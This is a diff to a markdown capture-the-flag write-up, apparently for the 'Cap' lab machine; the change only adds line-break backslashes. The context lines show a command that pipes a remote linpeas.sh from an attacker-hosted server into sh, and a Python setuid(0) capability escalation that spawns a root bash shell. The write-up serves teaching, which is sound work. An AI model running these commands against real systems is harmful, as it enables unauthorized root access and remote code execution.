@@ -49,7 +49,7 @@ sudo python3 -m http.server 80
 ```
 curl 10.10.16.41/linpeas.sh | sh
 ```
-4. Let it run
+4. Let it run\
 ![Running LinPeas](./images/Cap-LinPeas.png)
 5. Found the supposed vulnerable files and the capability that can be exploited!
 ![LinPeas Result.png](./images/Cap-LinPeas2.png)
@@ -61,7 +61,7 @@ curl 10.10.16.41/linpeas.sh | sh
 >>> os.setuid(0)
 >>> os.system("/bin/bash")
 ```
-Result:
+Result:\
 ![Exploit Python Capabilities](./images/Cap-Python.png)
 
 Try to get into the parent directory, outside of the current working directory which is `/home/nathan/`
